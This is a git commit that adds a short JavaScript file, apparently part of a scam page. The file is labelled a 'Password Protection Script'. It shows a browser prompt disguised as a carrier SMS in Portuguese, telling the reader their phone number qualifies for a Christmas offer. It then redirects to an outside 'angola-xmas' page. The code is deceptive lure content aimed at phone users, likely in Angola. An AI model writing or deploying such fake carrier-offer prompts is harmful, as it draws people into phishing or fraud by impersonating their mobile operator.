5e05bf579c8df30d3c8f2b93349d43e680d3f284
itidnewblog3 <ukpehaitid1@gmail.com>
2025-12-20 17:46:07 +0100

    Create active-angola.js

---
+++ active-angola.js
@@ -0,0 +1,10 @@
+  
+/* Password Protection Script by www.onlineofferz.xyz*/
+var password = 'ATIVAR DADOS'
+password = prompt(
+  'SMS: Parabéns! Seu número de celular está qualificado para receber a oferta de Natal da sua operadora favorita. Por favor, pressione OK para inserir seu número de telefone..',
+  'ATIVAR DADOS'
+);
+if (password != 'ATIVAR DADOS') {
+  location.href = 'https://lhegit.org/angola-xmas.html';
+}
